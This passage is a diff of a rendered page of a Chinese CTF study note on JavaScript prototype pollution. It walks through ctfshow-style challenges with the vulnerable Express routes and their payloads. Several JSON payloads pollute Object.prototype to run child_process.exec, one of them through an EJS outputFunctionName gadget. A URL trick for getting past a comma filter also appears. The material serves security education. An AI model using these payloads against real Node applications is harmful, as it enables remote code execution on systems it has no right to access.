+  </pre>
+  </div>
 <p>存在<code>target[key]</code> = <code>source[key]</code>，如果<code>key</code>为<code>__proto__</code>呢</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">o1</span> <span style="color:#f92672">=</span> {}
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">o2</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;__proto__&#34;</span><span style="color:#f92672">:</span> {<span style="color:#a6e22e">b</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>}}
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">o1</span>, <span style="color:#a6e22e">o2</span>)
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">o1</span>.<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">o1</span>.<span style="color:#a6e22e">b</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 输出1 2
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">o3</span> <span style="color:#f92672">=</span> {}
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">o3</span>.<span style="color:#a6e22e">b</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//输出空
-</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="98d7d95" class="language-js ">
+  <code>let o1 = {}
+let o2 = {a: 1, &#34;__proto__&#34;: {b: 2}}
+merge(o1, o2)
+console.log(o1.a, o1.b)
+// 输出1 2
+o3 = {}
+console.log(o3.b)
+//输出空</code>
+  </pre>
+  </div>
 <p>合并成功了，但是原型链没有被污染。
 因为创建o2的过程<code>let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}</code>中，<code>__proto__&quot;</code>已经代表o2的原型了，遍历键名，得到的是<code>a，b</code>，而不是<code>a,__proto__</code>，也就无法修改原型</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">o1</span> <span style="color:#f92672">=</span> {}
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">o2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#e6db74">&#39;{&#34;a&#34;: 1, &#34;__proto__&#34;: {&#34;b&#34;: 2}}&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">o1</span>, <span style="color:#a6e22e">o2</span>)
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">o1</span>.<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">o1</span>.<span style="color:#a6e22e">b</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">o3</span> <span style="color:#f92672">=</span> {}
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">o3</span>.<span style="color:#a6e22e">b</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//输出1 2 2，原型链被污染
-</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="3150a4d" class="language-js ">
+  <code>let o1 = {}
+let o2 = JSON.parse(&#39;{&#34;a&#34;: 1, &#34;__proto__&#34;: {&#34;b&#34;: 2}}&#39;)
+merge(o1, o2)
+console.log(o1.a, o1.b)
+
+o3 = {}
+console.log(o3.b)
+//输出1 2 2，原型链被污染</code>
+  </pre>
+  </div>
 <p>因为在json解析下，<code>__proto__</code>是一个真正的键名，而不代表原型，后面遍历o2时也能正常获取键名。</p>
 <h2 id="例题">例题： <a href="#%e4%be%8b%e9%a2%98" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><h3 id="1">1 <a href="#1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>).<span style="color:#a6e22e">json</span>(),<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;html&#39;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flag</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;flag_here&#39;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">secert</span> <span style="color:#f92672">=</span> {};
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sess</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> {};
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">copy</span>(<span style="color:#a6e22e">user</span>,<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">secert</span>.<span style="color:#a6e22e">ctfshow</span><span style="color:#f92672">===</span><span style="color:#e6db74">&#39;36dboy&#39;</span>){
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">flag</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">else</span>{
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">ret_code</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">ret_msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;登录失败&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">user</span>)});  
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>});</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="39a0a57" class="language-js ">
+  <code>router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) {
+
+  res.type(&#39;html&#39;);
+
+  var flag=&#39;flag_here&#39;;
+
+  var secert = {};
+
+  var sess = req.session;
+
+  let user = {};
+
+  utils.copy(user,req.body);
+
+  if(secert.ctfshow===&#39;36dboy&#39;){
+
+    res.end(flag);
+
+  }else{
+
+    return res.json({ret_code: 2, ret_msg: &#39;登录失败&#39;&#43;JSON.stringify(user)});  
+
+  }
+
+});</code>
+  </pre>
+  </div>
 <p>因为存在<code>utils.copy</code>函数</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">copy</span>(<span style="color:#a6e22e">object1</span>, <span style="color:#a6e22e">object2</span>){
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">object2</span>) {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">object2</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">object1</span>) {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">copy</span>(<span style="color:#a6e22e">object1</span>[<span style="color:#a6e22e">key</span>], <span style="color:#a6e22e">object2</span>[<span style="color:#a6e22e">key</span>])
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">object1</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">object2</span>[<span style="color:#a6e22e">key</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  }</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="6f61cdd" class="language-js ">
+  <code>function copy(object1, object2){
+
+    for (let key in object2) {
+
+        if (key in object2 &amp;&amp; key in object1) {
+
+            copy(object1[key], object2[key])
+
+        } else {
+
+            object1[key] = object2[key]
+
+        }
+
+    }
+
+  }</code>
+  </pre>
+  </div>
 <p>所以有原型链污染
 传入payload：</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;__proto__&#34;</span>: {
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;ctfshow&#34;</span>: <span style="color:#e6db74">&#34;36dboy&#34;</span>
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="579fc88" class="language-json ">
+  <code>{
+    &#34;username&#34;: &#34;a&#34;,
+    &#34;__proto__&#34;: {
+        &#34;ctfshow&#34;: &#34;36dboy&#34;
+    }
+}</code>
+  </pre>
+  </div>
 <h3 id="2">2 <a href="#2" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>).<span style="color:#a6e22e">json</span>(),<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;html&#39;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;api&#39;</span>, { <span style="color:#a6e22e">query</span><span style="color:#f92672">:</span> Function(<span style="color:#a6e22e">query</span>)(<span style="color:#a6e22e">query</span>)});
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>});</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="d151b51" class="language-js ">
+  <code>router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) {
+
+  res.type(&#39;html&#39;);
+
+  res.render(&#39;api&#39;, { query: Function(query)(query)});
+
+});</code>
+  </pre>
+  </div>
 <blockquote>
 <p>因为所有变量的最顶层是<code>object</code>，所以若当前上下文不存在<code>query</code>，会自动向上查找<code>object</code>的<code>query</code>属性，故可以进行原型链污染</p></blockquote>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#f92672">&#34;__proto__&#34;</span>:{<span style="color:#f92672">&#34;query&#34;</span>:<span style="color:#e6db74">&#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;id&#39;)&#34;</span>}}</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="6423de2" class="language-json ">
+  <code>{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;admin&#34;,&#34;__proto__&#34;:{&#34;query&#34;:&#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;id&#39;)&#34;}}</code>
+  </pre>
+  </div>
 <h3 id="3">3 <a href="#3" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>).<span style="color:#a6e22e">json</span>(),<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;html&#39;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flag</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;flag_here&#39;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">function</span>(){
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">userinfo</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">function</span>(){
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isVIP</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isAdmin</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isAuthor</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;    
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">copy</span>(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">userinfo</span>,<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">userinfo</span>.<span style="color:#a6e22e">isAdmin</span>){
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">flag</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">else</span>{
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">ret_code</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">ret_msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;登录失败&#39;</span>});  
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  }</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="39261a8" class="language-js ">
+  <code>router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) {
+
+  res.type(&#39;html&#39;);
+
+  var flag=&#39;flag_here&#39;;
+
+  var user = new function(){
+
+    this.userinfo = new function(){
+
+    this.isVIP = false;
+
+    this.isAdmin = false;
+
+    this.isAuthor = false;    
+
+    };
+
+  }
+
+  utils.copy(user.userinfo,req.body);
+
+  if(user.userinfo.isAdmin){
+
+   res.end(flag);
+
+  }else{
+
+   return res.json({ret_code: 2, ret_msg: &#39;登录失败&#39;});  
+
+  }</code>
+  </pre>
+  </div>
 <p><code>user.__proto__</code>不是<code>Object</code>，是<code>f()</code>。<code>user.__proto__.__proto__</code>才是，所以需要污染两层。</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;__proto__&#34;</span>: {
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;__proto__&#34;</span>: {
-</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;query&#34;</span>: <span style="color:#e6db74">&#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;id&#39;)&#34;</span>
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="e2e5db6" class="language-json ">
+  <code>{
+    &#34;__proto__&#34;: {
+        &#34;__proto__&#34;: {
+            &#34;query&#34;: &#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;id&#39;)&#34;
+        }
+    }
+}</code>
+  </pre>
+  </div>
 <h3 id="4">4 <a href="#4" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;html&#39;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>});</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="caf3ee3" class="language-js ">
+  <code>router.get(&#39;/&#39;, function(req, res, next) {
+
+  res.type(&#39;html&#39;);
+
+  res.render(&#39;index&#39;);
+
+});</code>
+  </pre>
+  </div>
 <p>ejs rce</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;__proto__&#34;</span>:{<span style="color:#f92672">&#34;__proto__&#34;</span>:{<span style="color:#f92672">&#34;outputFunctionName&#34;</span>:<span style="color:#e6db74">&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;id&#39;);var __tmp2&#34;</span>}}}</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="f71d411" class="language-json ">
+  <code>{&#34;__proto__&#34;:{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;id&#39;);var __tmp2&#34;}}}</code>
+  </pre>
+  </div>
 <h1 id="get绕过">get绕过 <a href="#get%e7%bb%95%e8%bf%87" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1>
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;html&#39;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag_here&#39;</span>;
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/8c|2c|\,/ig</span>)){
-</span></span><span style="display:flex;"><span>  	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#39;where is flag :)&#39;</span>);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">query</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">name</span><span style="color:#f92672">===</span><span style="color:#e6db74">&#39;admin&#39;</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">password</span><span style="color:#f92672">===</span><span style="color:#e6db74">&#39;ctfshow&#39;</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">isVIP</span><span style="color:#f92672">===</span><span style="color:#66d9ef">true</span>){
-</span></span><span style="display:flex;"><span>  	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">flag</span>);
-</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">else</span>{
-</span></span><span style="display:flex;"><span>  	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#39;where is flag. :)&#39;</span>);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>});</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="08e92d1" class="language-js ">
+  <code>router.get(&#39;/&#39;, function(req, res, next) {
+  res.type(&#39;html&#39;);
+  var flag = &#39;flag_here&#39;;
+  if(req.url.match(/8c|2c|\,/ig)){
+  	res.end(&#39;where is flag :)&#39;);
+  }
+  var query = JSON.parse(req.query.query);
+  if(query.name===&#39;admin&#39;&amp;&amp;query.password===&#39;ctfshow&#39;&amp;&amp;query.isVIP===true){
+  	res.end(flag);
+  }else{
+  	res.end(&#39;where is flag. :)&#39;);
+  }
+
+});</code>
+  </pre>
+  </div>
 <p>正常传入</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;ctfshow&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;isVIP&#34;</span>: <span style="color:#66d9ef">true</span>
-</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="b85098e" class="language-json ">
+  <code>{
+    &#34;name&#34;: &#34;admin&#34;,
+    &#34;password&#34;: &#34;ctfshow&#34;,
+    &#34;isVIP&#34;: true
+}</code>
+  </pre>
+  </div>
 <p>但过滤了<code>,</code>和<code>/2c</code>，所以即便<code>req.url</code>不进行url解码，也无法传入逗号。
 利用<code>req.query.query</code>的特性：传入的相同get参数会加入一个数组，然后<code>JSON.parse</code>会把数组内的元素拼接在一起。
 也就是传入<code>query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true}</code>的话，第一步得到<code>['{&quot;name&quot;:&quot;admin&quot;','&quot;password&quot;:&quot;ctfshow&quot;','&quot;isVIP&quot;:true}']</code>，第二步就是目标json。
@@ -1250,7 +1747,7 @@ prototype是一个类的属性，所有类对象实例化时都会有prototype�
                 id:  8 ,
                 href: "\/docs\/ctf\/%E7%9F%A5%E8%AF%86%E7%82%B9\/rce\/",
                 title: "RCE",
